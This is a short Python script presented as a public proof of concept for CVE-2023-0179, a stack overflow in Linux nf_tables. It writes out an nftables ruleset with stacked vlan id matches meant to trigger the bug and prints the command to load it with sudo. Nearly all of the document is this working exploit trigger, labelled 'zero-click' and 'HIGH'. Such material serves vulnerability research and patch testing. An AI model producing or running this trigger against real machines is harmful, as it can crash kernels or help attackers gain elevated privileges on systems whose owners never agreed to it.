#!/usr/bin/env python3
"""CVE-2023-0179 — nf_tables stack overflow (nft_payload_copy_vlan).
Zero-click for a box with nftables. Public PoC. HIGH."""
import sys
from pathlib import Path

NFT = r'''
table netdev poc {
    chain ingress {
        type filter hook ingress device "eth0" priority 0; policy accept;
        vlan id 1 vlan id 2 vlan id 3 vlan id 4 ip saddr 127.0.0.1 counter
    }
}
'''

def build() -> bytes: return NFT.encode()

def main():
    out = Path(sys.argv[1] if len(sys.argv) > 1 else "cve-2023-0179.nft")
    out.write_bytes(build())
    print(f"[+] CVE-2023-0179 nftables -> {out}  (sudo nft -f {out})")

if __name__ == "__main__":
    main()
